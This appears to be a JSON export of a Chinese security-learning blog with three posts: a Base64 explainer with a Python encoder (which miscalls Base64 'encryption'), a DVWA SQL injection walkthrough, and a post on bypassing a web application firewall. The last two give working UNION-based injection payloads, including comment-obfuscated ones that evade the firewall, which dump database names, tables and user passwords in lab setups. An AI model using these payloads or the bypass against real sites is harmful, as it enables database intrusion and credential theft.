{"meta":{"title":"Mlins's blog","subtitle":"Will you believe me all the time?","description":null,"author":"Mlins","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"Base64加密原理","slug":"Base64加密原理","date":"2018-06-02T16:07:33.000Z","updated":"2018-06-03T04:39:02.000Z","comments":true,"path":"2018/06/03/Base64加密原理/","link":"","permalink":"http://yoursite.com/2018/06/03/Base64加密原理/","excerpt":"","text":"回顾一下以前学的知识:Base64加密原理base64加密是先接受一串字符串，将其转化为二进制，然后再从前往后分组每组6个二进制位，不足6位的，再后面补0，如果补了几个00，则需要加密后再后面加几个=，下面就拿加密字符‘A’来讲解吧 1.将A转二进制010000012.把该二进制从前往后分6个二进制位一组，不足6位的后面补0: 010000 010000补了2个00，记下3.将二进制转化成十进制:16 164.根据base64独有字符表进行转化成字符16对应的是Q，所以转化之后的字符串为QQ5.填充=因为我们之前填充了两个00，所以最终加密结果为QQ==最后附上我用python写的一个简单加密程序12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding:utf-8 -*-decode=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',0,1,2,3,4,5,6,7,8,9,'+','/']str1=''result=''row=''i=0number=raw_input(\"Please input will encode string:\")print '\\n'for x in number: h=bin(ord(x))[2:] if len(h)&lt;8: #判断每个字符转为二进制后是否为8位，不足高位补0 h='0'+h str1+=h#将所有二进制位合并for x in str1: if x!=' ': result+=str(x) #Base64 加密过程while i&lt;len(result):#判断填充=的个数 if len(result)%6==0: a3='' elif len(result)%6==2: a3='==' elif len(result)%6==4: a3='=' else: print 'ERROR'#切割二进制位 8变6，不够填充00 str2=result[i:i+6] while len(str2)&lt;6: str2+='00' print 'bin:'+str2+' dec:'+str(int(str2,2))+' base64:'+str(decode[int(str2,2)]) row+=str(decode[int(str2,2)]) i+=6print '\\nSuccessful Eecode: '+row+a3","categories":[],"tags":[{"name":"cryptography","slug":"cryptography","permalink":"http://yoursite.com/tags/cryptography/"}],"keywords":[]},{"title":"DWVA-SQL injection-low关卡","slug":"DWVA-SQL注入关卡","date":"2018-06-02T16:07:33.000Z","updated":"2018-06-03T12:43:42.000Z","comments":true,"path":"2018/06/03/DWVA-SQL注入关卡/","link":"","permalink":"http://yoursite.com/2018/06/03/DWVA-SQL注入关卡/","excerpt":"","text":"先查看源代码 123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; mysqli_close($GLOBALS[\"___mysqli_ston\"]);&#125;?&gt; 0x01判断注入点及类型是没有任何防护的，可以直接注入，所以在URL上输入id=1&#39;+and+1=1%23先判断是否存在注入点页面显示正常再输入id=1&#39;+and+1=2%23页面显示异常所以这里存在字符型的GET注入，其实看了源码就应该知道了 0x02猜字段数输入id=1&#39;+order+by+字段数%23当我输入到3的时候，页面显示Unknown column &#39;3&#39; in &#39;order clause&#39;表明查询语句只查了两个字段，通过源码我们也能看得出 0x03爆当前数据库名、用户名、以及数据库版本因为有两个字段数，所以我们接下来的语句是:id=1&#39;+union+select+1,2%23可以看到我们查询的1，2都显示出来了，我们就通过这个位置来爆我们想要的东西 然后输入id=1&#39;+union+select+1,concat(database(),&#39;|&#39;,version(),&#39;|&#39;,user())%23，因为concat函数是将字符串连接起来的函数，我们可以通过这个函数在一个位置爆出我们所有想要的东西，这里指当前数据库名、用户名以及版本。 0x04爆当前数据库的所有表名根据上一个环节可知数据库名为:dvwa然后根据数据id=1&#39;+union+select+1,table_name+from+information_schema.tables+where+table_schema=&#39;dvwa&#39;%23可爆出全部的表名table_name值得是表名的字段，table_schema表示要查询的数据库名，information_schema是一个系统库，里面包含了数据库所有的数据库。 0x05爆表里的字段名就爆users表里的字段吧输入id=1&#39;+union+select+1,column_name+from+information_schema.columns+where+table_schema=&#39;dvwa&#39;+and+table_name=&#39;users&#39;%23可爆出users表的所有字段 0x06爆字段的所有内容还是users表输入id=1&#39;+union+select+user,password+from+users%23由于每次只能查两个字段，所以这里我就只查user,和password字段","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://yoursite.com/tags/sql/"},{"name":"dwva","slug":"dwva","permalink":"http://yoursite.com/tags/dwva/"}],"keywords":[]},{"title":"Fuzz过狗注入","slug":"Fuzz过狗注入","date":"2018-05-31T13:13:14.000Z","updated":"2018-06-03T04:38:00.000Z","comments":true,"path":"2018/05/31/Fuzz过狗注入/","link":"","permalink":"http://yoursite.com/2018/05/31/Fuzz过狗注入/","excerpt":"今天在虚拟机上安装一个WEB安全狗，打算绕绕狗","text":"今天在虚拟机上安装一个WEB安全狗，打算绕绕狗然后也搭建一个sqli-labs注入环境先通过order by可判断字段数为3个，这里就不详细解释了当我们准备使用union select联合查询的时候，会被安全狗拦截原本打算写个脚本进行fuzz测试的，但是后来发现脚本跑出来的能绕狗，但是sql会报错，奇怪的是放入Mysql终端执行又能正常查询，没办法，只能手工fuzz测试 对于安全狗的拦截特征，个人理解是:123456因安全狗是根据特征来判断你输入的内容是否安全比如你单输入一个union不会被拦又或者你单输入一个select也不会被拦截但是如果你输入一个union select，就会被拦所以fuzz就是构造一些奇怪的字符又不会被数据库解析的东西从而来混淆安全狗的匹配规则 这里手工测试的过狗payload是:1?id=1+/*!union*//**//*!select*/+1,2,3+%23 可成功绕狗 然后就是查当前数据库名:1?id=-1+/*!union*//**//*!select*/+1,database/*!()*/,3+%23 接着查询表名，可通过修改limit 0,1的值来查询上下表1?id=-1+/*!union*//**//*!select*/+1,table_name,3+/*!from*//**//*!information_schema.tables*/+where+table_schema='security'+limit+0,1%23 继续查询字段名,可通过修改limit 0,1的值来查询上下字段1?id=-1+/*!union*//**//*!select*/+1,column_name,3+/*!from*//**//*!information_schema.columns*/+where+table_schema='security'/**//*!and*//**/table_name='users'+limit+1,1%23 最后就是查询字段内容,可通过修改limit 0,1来查询上下字段内容值1?id=-1+/*!union*//**//*!select*/+1,username,3+from+users+limit+1,1%23 是不是自己也想去试试呢？","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"http://yoursite.com/tags/bypass/"}],"keywords":[]}]}